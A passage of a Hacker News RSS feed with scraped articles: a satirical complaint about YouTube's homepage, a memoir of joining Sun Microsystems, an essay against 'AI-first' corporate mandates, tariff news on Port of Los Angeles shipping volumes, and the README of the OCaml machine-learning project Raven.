<p><img src="https://jayd.ml/assets/posts/2025-04-30-someone-at-youtube-needs-glasses/abomination.png"></p>

<p>This is on a 32â€ 1440p display. There are five (5) videos visible, and 1/6 of 
the page would have been an enormous ad.</p>

<p>For reference, here is YouTube as of January 2019:</p>

<p><img src="https://jayd.ml/assets/posts/2025-04-30-someone-at-youtube-needs-glasses/old.png"></p>

<p>There are 30 videos visible and zero ads.</p>

<p>I really, really hope that this A/B test fails.</p>

<p>Unfortunately, using an advanced analytics package Iâ€™ve projected that around
May 2026 the YouTube homepage will just be one video, and by September there 
will be no videos at all on the homepage.</p>

<p><img src="https://jayd.ml/assets/posts/2025-04-30-someone-at-youtube-needs-glasses/projection.png"></p>

<p>Presumably by then weâ€™ll have our mandatory NeuraLinks and the YouTube algorithm
will be able to inject real-time ML generated content (and ads) straight into 
our brains, tuning its output as needed to maximize our dopamine response.</p>

<p>I miss YouTube before they turned the pain dial all the way towards money.</p>

  </div>
</article>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Joining Sun Microsystems â€“ 40 years ago (2022) (175 pts)]]></title>
            <link>https://akapugs.blog/2022/05/03/674/</link>
            <guid>43846187</guid>
            <pubDate>Wed, 30 Apr 2025 14:57:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://akapugs.blog/2022/05/03/674/">https://akapugs.blog/2022/05/03/674/</a>, See on <a href="https://news.ycombinator.com/item?id=43846187">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-674">
			<!-- .entry-header -->		<!-- .entry-meta -->
	
	<div dir="auto">
<p>40 years ago today:  I joined a tiny startup called Sun Microsystems. What a ride! Hereâ€™s the never-before-told story of how I arrived at Sun as employee #8! ðŸ§µ <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qRpDXwAETXI_.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qRpDXwAETXI_.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>I started out in Silicon Valley in June of 1978 working at Amdahl Corp. porting UNIX to the mainframe, a revival of the work started at Princeton in 1975. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qSypXMAI9PX3.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qSypXMAI9PX3.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>Sometime in late â€™80 I moved over to Amdahlâ€™s architecture group to work on data communications â€“ X.25, SNA, etc.  But that work wasnâ€™t too satisfying. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qTZrXEAMeNEv.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qTZrXEAMeNEv.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>During the UNIX/UTS work I had been up to Berkeley a few times to see talks by Bill Joy and others about BSD UNIX (I think I was the first person to implement the select system call, though it never made it to product). Anyways, I guess Bill remembered me. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qTuLXIAQXgNR.png?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qTuLXIAQXgNR.png?w=1100&amp;ssl=1"></a></span></p>
<p>There was *intense* startup fever in the Silicon Valley in 81/82. I  was caught up in it and actively looking for a startup â€“ I even bought books and magazines about starting companies. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qUC3XIAYBjMv.png?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qUC3XIAYBjMv.png?w=1100&amp;ssl=1"></a></span></p>
<p>ðŸ”¥ðŸ”¥ðŸ”¥ At that time UNIX and Motorola 68000 were HOT technologies ðŸ”¥ðŸ”¥ðŸ”¥ â€“ there were literally (yes, truly) 100 startup companies doing something with the combination.</p>
<p>Most of the well-funded ones were building time-shared minicomputers to attack DEC â€“ Altos Computer Systems was a prime example. There were a bunch of bottom feeders targeting the home-brew market, and then there were a few with real differentiation. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qUixXwAEsSde.png?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qUixXwAEsSde.png?w=1100&amp;ssl=1"></a></span></p>
<p>I had talked with Valid Logic Systems, who were building a CAD workstation. Good people, but CAD was not my thing so I didnâ€™t have any feeling about the business. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qVYGWUAQnm53.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qVYGWUAQnm53.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>I also talked with Fortune Systems. John Bass, pretty well known in the UNIX world, was there and trying to get me. Fortune was very well funded and going after the Wang word processing market. I still have never seen a Wang system in person, so that was not my bag either. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qVwkWQAUcsNB.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qVwkWQAUcsNB.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>But letâ€™s talk about my unfair advantage â€“ my Lyon family mafia. I was living with my brother Bob and his wife. Bob was working at Xerox SDD developing the Xerox Star workstation. And my brother Dick was at Xerox PARC with an Alto on his desk! So I knew workstations. <span><span><span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qWKUXoAIa9Gb.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qWKUXoAIa9Gb.jpg?w=1100&amp;ssl=1"></a></span></span><span><span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qWLyXsAAiAsP.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qWLyXsAAiAsP.jpg?w=1100&amp;ssl=1"></a></span></span></span></p>
<p>Bob had a friend from SDD, Glenn, who would come over to our house to shoot the breeze; and he started raving one time about the SUN project at Stanford and about how cool the processor board was, and how we should all buy one if we could (for homebrew hacking). <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qW6GXwAEyWNe.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qW6GXwAEyWNe.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>So I knew about SUN. One day Scott McNealy called me out of the blue, having found me at Amdahl. He said he was with a company called Sun Microsystems. I responded â€œOh! Are you doing something with the SUN board?â€  He was NOT expecting that. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qXRVXMAAjPnZ.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qXRVXMAAjPnZ.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>So I went for an interview and met Scott, Andy Bechtolsheim, and Vinod Khosla. Thatâ€™s when they told me that they had landed Bill Joy â€“ and that was who gave Scott my name (on a list with 20+ others). The combination of UNIX, workstations, and Bill Joy sealed the deal for me. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qXk6WUAI1alB.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qXk6WUAI1alB.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>My bit of diligence was to check with my brother Dick about Andy B.  Andy had interned with Xerox PARC while developing the SUN 3Mb Ethernet card. Dick assured me he had a good reputation. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qX5IXwAI9pbH.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qX5IXwAI9pbH.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>So I got an offer letter from Vinod. When talking to him about it, I pushed a little on the stock option number. He reacted viscerally with â€œThatâ€™s a good number!â€  I think others had already moved him to a higher amount. Anyways, I was a push-over. I accepted. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qYO3XwAI76Nx.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qYO3XwAI76Nx.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>When I told my brother Bob, he was rather distressed. We were just managing a house mortgage with 3 full time incomes. Interest rates then were well above 10%. But no worries; a year later he was at Sun too. <span><video autoplay="" muted="" loop="" controls="" poster="https://pbs.twimg.com/tweet_video_thumb/FR1qY7WXEAA0sqL.jpg"><source src="https://video.twimg.com/tweet_video/FR1qY7WXEAA0sqL.mp4" type="video/mp4"><img data-recalc-dims="1" decoding="async" alt="Video Poster" src="https://i0.wp.com/pbs.twimg.com/tweet_video_thumb/FR1qY7WXEAA0sqL.jpg?w=1100&amp;ssl=1"></video></span></p>
<p>I started on May 3. Bruce Smith, employee #9, started the same day. We each followed the other around for a while thinking they had been there already. The office was at 2310 Walsh in Santa Clara, across from todayâ€™s Nvidia campus. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qaOPX0AIoST_.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qaOPX0AIoST_.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>Bill Shannon(RIP) started a couple of weeks later with lots of BSD UNIX experience already, and together we were the fearsome kernel team. His fun title was â€œvirtual memory managerâ€ and mine was â€œdirector of devicesâ€ <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qatDWQAQWMCD.png?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qatDWQAQWMCD.png?w=1100&amp;ssl=1"></a></span></p>
<p>My first success at Sun was in debugging a disk driver in UNISOFT UNIX (a V7 port for the 68K). The bug would scramble the disk whenever swapping started. With the fix, we could ship UNIX with Sun-1s. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qbPSX0AIIx7C.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qbPSX0AIIx7C.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>A year after I started, Sun was a whole lot of great people with new buildings in Mountain View, shipping zillions of workstations with BSD UNIX, 68010s, and 10Mb Ethernet. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qb35X0AQpV6i.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qb35X0AQpV6i.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>I am eternally grateful for the opportunity to have been part of the Sun Microsystems phenomenon. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qcUmWYAk4iUk.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qcUmWYAk4iUk.jpg?w=1100&amp;ssl=1"></a></span></p>
</div><!-- .entry-content -->

	<!-- .entry-footer -->

	<div>
				<!-- .entry-auhtor -->
				<p><strong>Published</strong>
			<time datetime="2022-05-03T01:33:00+00:00">May 3, 2022</time><time datetime="2022-05-23T02:01:20+00:00">May 23, 2022</time>		</p><!-- .site-posted-on -->
	</div>
</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA["AI-first" is the new Return To Office (315 pts)]]></title>
            <link>https://www.anildash.com//2025/04/19/ai-first-is-the-new-return-to-office/</link>
            <guid>43845089</guid>
            <pubDate>Wed, 30 Apr 2025 13:38:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.anildash.com//2025/04/19/ai-first-is-the-new-return-to-office/">https://www.anildash.com//2025/04/19/ai-first-is-the-new-return-to-office/</a>, See on <a href="https://news.ycombinator.com/item?id=43845089">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <p>The latest fad amongst tech CEOs is no longer "founder mode", or taking drugs that they would fire you for taking, or telling everybody to return to the office â€” it's demanding that all work be AI-first! This is a great idea if you think nobody at your company is great at what they do. It may otherwise be a suboptimal strategy. Let's dive in!</p>
<p>Let's use me as a case study. I'm pretty okay at writing. For example, one time I <a href="https://www.anildash.com/2015/07/11/the_internet_of_tweets/">wrote a fairly technical analysis</a> of Twitter's platform strategy that inspired Will.I.Am of the Black Eyed Peas to start Twitter beef with me two years later when he read the post and took offense to my referring to him as "nobodyâ€™s favorite rapper".</p>
<p>This is something your GPTs cannot do, I assure you. An average LLM won't even know that Drake's favorite MIME type is <code>application/pdf</code>. Chalk one up for the greatness of human creativity.</p>
<h2>The AI-First Mind Virus</h2>
<p>Shopify's CEO Tobi LÃ¼tke (personal motto: "what if a Canadian was all the worst things about the United States?") started the "AI-first" trend, with <a href="https://www.theverge.com/news/644943/shopify-ceo-memo-ai-hires-job">one of those big memos</a> that included, amongst other things, the declaration that "We will add Al usage questions to our performance and peer review questionnaire." This is unusual â€” did your boss ever have to send you a memo demanding that you use a smartphone? Was there a performance review requiring you to use Slack? I'm actually old enough that I was at different workplaces when they started using spreadsheets and email and the web, and I can tell you, they absolutely didn't have to drive adoption by making people fill out paperwork about how they were definitely using the cool new technology. Isn't that interesting?</p>
<p>Some of the other CEOs talking about the use of AI are a little more reasonable. Duolingo's CEO Luis von Ahn seems to be trying to be <em>somewhat</em> more moderate in <a href="https://www.linkedin.com/feed/update/urn:li:activity:7322560534824865792/">his memo</a>, stating plainly that he doesn't see AI replacing his employees. (Though that does immediately raise the "who brought that up?" question...) Yet even in this more even-handed take, we still get the insistence that "Al use will be part of what we evaluate in performance reviews". This is really weird!</p>
<p>The funny thing is, I'm not saying LLMs are without their uses. Let's use me as a case study again. I'm a lousy coder, these days. I haven't had time to keep up my skills, and the area I focused on for most of my dev career (front end web development) changes particularly quickly. So I use some of the modern tools to help me get up to speed and get more done in a limited amount of time, because otherwise I'm woefully unproductive in the short windows I have to code in my free time.</p>
<p>To be explicit: I code on the weekends, not professionally. That means I'm not very good at it. I'm certainly <em>nothing</em> like the incredibly talented developers that I've had the good fortune to work with over the years. I'm just fluent enough to be able to debug the broken code that LLMs generate, or to catch the bugs that they spew out by default. And I'm sure I don't even catch all the bugs that pop up, but fortunately, I'm not making any production systems; I'm just building little toy apps and sites for myself.</p>
<p>This is an important illustration: AI is really good for helping you if you're bad at something, or at least below average. But it's probably not the right tool if you're great at something. So why would these CEOs be saying, almost all using the exact same phrasing, that everyone at their companies should be using these tools? Do they think their employees are all bad at their jobs?</p>
<h2>Groupthink and signaling</h2>
<p>Big tech CEOs and VCs really love performing for each other. We know they hang out in group chats like high schoolers, preening and sending each other texts, each trying to make sure they're all wearing the latest fashions, whether it's a gold chain or a MAGA hat or just repeating a phrase that they heard from another founder. A key way of showing that they're part of this cohort is to make sure they're having a tantrum and acting out against their workers fairly regularly.</p>
<p>The return to office fad was a big part of this effort, often largely motivated by reacting to the show of worker power in the racial justice activism efforts of 2020. Similarly, being AI-first shows that a company is participating in the AI trend in the "right" way, by imposing it on workers, rather than trusting workers to judge what tools are useful for them to do their jobs.</p>
<p>A more normal policy on AI at a company might be something like this:</p>
<blockquote>
<p>Our IT department has evaluated a set of LLM tools and determined that these ones meet our requirements for security, performance, data governance, reliability, manageability and integration with our workflows. We'll be doing a controlled deployment of these tools and you can choose to use them if you think they'll help you with your work; please share your feedback on whether they are helpful, and what might make them more useful for you over time. Here are the ways these AI tools meet our corporate standards for compliance with intellectual property consent, sustainability and environmental goals, and accessibility.</p>
</blockquote>
<p>This would not get you invited to the fascist VC group chat, tho!</p>
<h2>AI-Second? Third?</h2>
<p>How did we get here? What can we do? Maybe it starts by trying to just... be <em>normal</em> about technology.</p>
<p>There's an orthodoxy in tech tycoon circles that's increasingly referred to, ironically, as "tech optimism". I say "ironically", because there's nothing optimistic about it. The culture is one of deep insecurity, reacting defensively, or even lashing out aggressively, when faced with any critical conversation about new technology. That tendency is paired with a desperate and facile cheerleading of startups, ignoring the often equally interesting technologies stories that come from academia, or from mature industries, or from noncommercial and open source communities that don't get tons of media coverage, but quietly push forward innovating without the fame and fortune. By contrast, those of us who actually <em>are</em> optimistic about technology (usually because we either create it, or are in communities with those who do) are just happily moving forward, not worrying when people point out the bugs that we all ought to be fixing together.</p>
<p>We don't actually have to follow along with the narratives that tech tycoons make up for each other. We choose the tools that we use, based on the utility that they have for us. It's strange to have to say it, but... there are people picking up and adopting AI tools on their own, because they find them useful. This is true, despite the fact that there is <em>so goddamn much</em> AI hype out there, with snake oil salesman pushing their bullshit religion of magical thinking machines and overpromising that these AI tools can do tasks that they're simply not capable of performing. It's telling that the creators of so many of the AI tools don't even have enough confidence in their offerings to simply let users choose to adopt them, and are instead forcing them into users' faces in every possible corner of their apps and websites.</p>
<p>The strangest part is, the AI pushers don't have to lie about what AI can do! If, as they say, AI tools are going to get better quickly, then <em>let them do so</em> and trust that smart people will pick them up and use them. If you think your workers and colleagues are too stupid to recognize good tools that will help them do their jobs better, then... you are a bad leader and should step down. Because you've created a broken culture.</p>
<p>But I don't think the audience for these memos is really the people who work at these companies. I think the audience is the other CEOs and investors and VCs in the industry, just as it was for the other fads of the last few years. And I expect that AI will indeed be part of how we evaluate performance in the future, but mostly in that the way CEOs communicate to their teams about technologies like AI will be part of how we all evaluate their performance as leaders.</p>

  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Port of Los Angeles says shipping volume will plummet 35% next week (686 pts)]]></title>
            <link>https://www.cnbc.com/2025/04/29/port-of-los-angeles-sees-shipping-volume-down-35percent-next-week-as-tariffs-bite.html</link>
            <guid>43844708</guid>
            <pubDate>Wed, 30 Apr 2025 13:07:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnbc.com/2025/04/29/port-of-los-angeles-sees-shipping-volume-down-35percent-next-week-as-tariffs-bite.html">https://www.cnbc.com/2025/04/29/port-of-los-angeles-sees-shipping-volume-down-35percent-next-week-as-tariffs-bite.html</a>, See on <a href="https://news.ycombinator.com/item?id=43844708">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="RegularArticle-ArticleBody-5" data-module="ArticleBody" data-test="articleBody-2" data-analytics="RegularArticle-articleBody-5-2"><div id="ArticleBody-InlineImage-108137934" data-test="InlineImage"><p>A container ship is shown at the Port of Los Angeles in Los Angeles, California, U.S. November 22, 2021. </p><p>Mike Blake | Reuters</p></div><div><p>Shipments from China to the West Coast of the U.S. will plummet next week as the impact of President <a href="https://www.cnbc.com/donald-trump/">Donald Trump</a>'s tariffs leads companies to cut their import orders.</p><p>Gene Seroka, executive director of the Port of Los Angeles, said Tuesday on <a href="https://www.cnbc.com/squawk-box-us/">CNBC's "Squawk Box</a>" that he expects incoming cargo volume to slide by more than a third next week compared with the same period in 2024.</p><p>"According to our own port optimizer, which measures the loadings in Asia, we'll be down just a little bit over 35% next week compared to last year. And it's a precipitous drop in volume with a number of major American retailers stopping all shipments from China based on the tariffs," Seroka said.</p></div><div id="Placeholder-ArticleBody-Video-108137936" data-test="VideoPlaceHolder" role="region" tabindex="0" data-vilynx-id="7000374247" aria-labelledby="Placeholder-ArticleBody-Video-108137936"><p><img src="https://image.cnbcfm.com/api/v1/image/108137937-17459285871745928584-39576606661-1080pnbcnews.jpg?v=1745928586&amp;w=750&amp;h=422&amp;vtcrop=y" alt="Port of LA's Gene Seroka on tariff impact: Retailers have about 5-7 weeks of full inventories left"><span></span><span></span></p></div><div><p>Shipments from China make up about 45% of the business for the Port of LA, though some transport companies will be looking to pick up goods at other points in Southeast Asia to try to fill up their ships, Seroka said.</p><p>"Realistically speaking, until some accord or framework can be reached with China, the volume coming out of there â€” save a couple of different commodities â€” will be very light at best," Seroka said.</p><p>Along with the lower volume of goods, Seroka said he expects roughly a quarter of the usual number of arriving ships to the port to be canceled in May.</p><p>Trump announced a sharp increase in tariffs on Chinese goods on April 2, which led to escalation on both sides, eventually resulting in both the U.S. and China imposing levies of more than 100% on many goods from each other. U.S. Treasury Secretary Scott Bessent has described the situation as "unsustainable" but there has been no sign of substantial negotiations between the two countries.</p><p>Data on shipments out of China had already started to <a href="https://www.cnbc.com/2025/04/22/busiest-us-ports-see-big-drop-in-chinese-freight-vessel-traffic.html">signal slowing trade volume</a> to the U.S., alarming some economists. Apollo Global Management's chief economist, Torsten Slok, recently laid out a timeline where lower imports from China leads to layoffs in transportation and retail industries in the U.S., empty shelves and a <a href="https://www.cnbc.com/2025/04/28/empty-shelves-trucking-layoffs-lead-to-recession-in-apollos-trade-war-timeline.html">recession this summer</a>.</p><p>Seroka said he thinks U.S. retailers have about five to seven weeks before the impact of the curtailed shipments begins to bite, partly because companies stocked up ahead of Trump's tariff announcements.</p><p>"I don't see a complete emptiness on store shelves or online when we're buying. But if you're out looking for a blue shirt, you might find 11 purple ones and one blue in a size that's not yours. So we'll start seeing less choice on those shelves simply because we're not getting the variety of goods coming in here based on the additional costs in place. And for that one blue shirt that's still left, you'll see a price hike," Seroka said.</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[U.S. Economy Contracts at 0.3% Rate in First Quarter (439 pts)]]></title>
            <link>https://www.wsj.com/economy/us-gdp-q1-2025-1f82f689</link>
            <guid>43844342</guid>
            <pubDate>Wed, 30 Apr 2025 12:38:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wsj.com/economy/us-gdp-q1-2025-1f82f689">https://www.wsj.com/economy/us-gdp-q1-2025-1f82f689</a>, See on <a href="https://news.ycombinator.com/item?id=43844342">Hacker News</a></p>
Couldn't get https://www.wsj.com/economy/us-gdp-q1-2025-1f82f689: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[OCaml's Wings for Machine Learning (103 pts)]]></title>
            <link>https://github.com/raven-ml/raven</link>
            <guid>43844279</guid>
            <pubDate>Wed, 30 Apr 2025 12:31:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/raven-ml/raven">https://github.com/raven-ml/raven</a>, See on <a href="https://news.ycombinator.com/item?id=43844279">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Raven</h2><a id="user-content-raven" aria-label="Permalink: Raven" href="#raven"></a></p>
<p dir="auto"><strong>OCaml's Wings for Machine Learning</strong></p>
<p dir="auto">Raven is a comprehensive ecosystem of libraries, frameworks, and tools that brings machine learning and data science capabilities to OCaml.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Vision</h2><a id="user-content-vision" aria-label="Permalink: Vision" href="#vision"></a></p>
<p dir="auto">Raven aims to make training models, running data science tasks, and building pipelines in OCaml as efficient and intuitive as Python, while leveraging OCaml's inherent type safety and performance advantages. We prioritize developer experience and seamless integration.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Status</h2><a id="user-content-status" aria-label="Permalink: Status" href="#status"></a></p>
<p dir="auto">Raven is currently in <strong>pre-alpha</strong> and we're seeking user feedback:</p>
<ul dir="auto">
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/ndarray">Ndarray</a></strong> and <strong><a href="https://github.com/raven-ml/raven/blob/main/hugin">Hugin</a></strong>: Scope is feature-complete for the first alpha release, though feedback may influence refinements.</li>
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/rune">Rune</a></strong>: Proof-of-concept stage.</li>
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/quill">Quill</a></strong>: Early prototyping phase.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">The Ecosystem</h2><a id="user-content-the-ecosystem" aria-label="Permalink: The Ecosystem" href="#the-ecosystem"></a></p>
<p dir="auto">Raven is a constellation of sub-projects, each addressing a specific aspect of the machine learning and data science workflow:</p>
<ul dir="auto">
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/ndarray">Ndarray</a></strong>: The core of Raven, providing high-performance numerical computation with multi-device support (CPU, GPU), similar to NumPy but with OCaml's type safety.
<ul dir="auto">
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/ndarray-cv">Ndarray-CV</a></strong>: A collection of computer vision utilities built on top of Ndarray.</li>
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/ndarray-io">Ndarray-IO</a></strong>: A library for reading and writing Ndarray data in various formats.</li>
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/ndarray-datasets">Ndarray-Datasets</a></strong>: Easy access to popular machine learning and data.
science datasets as Ndarrays.</li>
</ul>
</li>
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/quill">Quill</a></strong>: An interactive notebook application for data exploration, prototyping, and knowledge sharing.</li>
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/hugin">Hugin</a></strong>: A visualization library that produces publication-quality plots and charts.</li>
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/rune">Rune</a></strong>: A library for automatic differentiation and JIT compilation, inspired by JAX.</li>
<li><strong>(More to come!)</strong>: Raven is an evolving ecosystem, and we have exciting plans for additional libraries and tools to make OCaml a premier choice for machine learning and data science.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Python vs Raven: A Comparison</h2><a id="user-content-python-vs-raven-a-comparison" aria-label="Permalink: Python vs Raven: A Comparison" href="#python-vs-raven-a-comparison"></a></p>
<p dir="auto">The table below compares Python's popular data science libraries with their Raven counterparts. For detailed code examples, see the linked documentation files.</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Task</th>
<th>Python Ecosystem</th>
<th>Raven Ecosystem</th>
<th>Comparison Guide</th>
<th>Examples</th>
</tr>
</thead>
<tbody>
<tr>
<td>Numerical Computing</td>
<td>NumPy</td>
<td><a href="https://github.com/raven-ml/raven/blob/main/ndarray">Ndarray</a></td>
<td><a href="https://github.com/raven-ml/raven/blob/main/docs/compare_python_ndarray.md">Comparison Guide</a></td>
<td><a href="https://github.com/raven-ml/raven/blob/main/ndarray/example">Examples</a></td>
</tr>
<tr>
<td>Visualization</td>
<td>Matplotlib, Seaborn</td>
<td><a href="https://github.com/raven-ml/raven/blob/main/hugin">Hugin</a></td>
<td><a href="https://github.com/raven-ml/raven/blob/main/docs/compare_python_hugin.md">Comparison Guide</a></td>
<td><a href="https://github.com/raven-ml/raven/blob/main/hugin/example">Examples</a></td>
</tr>
<tr>
<td>Notebooks</td>
<td>Jupyter</td>
<td><a href="https://github.com/raven-ml/raven/blob/main/quill">Quill</a></td>
<td>N/A</td>
<td>N/A</td>
</tr>
<tr>
<td>Automatic Differentiation</td>
<td>JAX</td>
<td><a href="https://github.com/raven-ml/raven/blob/main/rune">Rune</a></td>
<td><em>In progress</em></td>
<td><em>In progress</em></td>
</tr>
<tr>
<td>Dataframe Manipulation</td>
<td>Pandas</td>
<td><em>Not yet</em></td>
<td>N/A</td>
<td>N/A</td>
</tr>
<tr>
<td>Deep Learning</td>
<td>Pytorch, Tensorflow</td>
<td><em>Not yet</em></td>
<td>N/A</td>
<td>N/A</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">We welcome contributions from everyoneâ€”whether you're an OCaml expert, a data scientist, or simply curious about the project:</p>
<ul dir="auto">
<li>Report issues for bugs or feature requests</li>
<li>Submit pull requests for code improvements, documentation, or examples</li>
</ul>
<p dir="auto">See our <a href="https://github.com/raven-ml/raven/blob/main/CONTRIBUTING.md">CONTRIBUTING.md</a> for detailed guidelines.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">Raven is available under the <a href="https://github.com/raven-ml/raven/blob/main/LICENSE">ISC License</a>, making it free for both personal and commercial use.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Retailers will soon have only about 7 weeks of full inventories left (459 pts)]]></title>
            <link>https://fortune.com/article/retailers-weeks-of-inventory-left-trump-china-trade-war/</link>
            <guid>43843821</guid>
            <pubDate>Wed, 30 Apr 2025 11:42:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://fortune.com/article/retailers-weeks-of-inventory-left-trump-china-trade-war/">https://fortune.com/article/retailers-weeks-of-inventory-left-trump-china-trade-war/</a>, See on <a href="https://news.ycombinator.com/item?id=43843821">Hacker News</a></p>
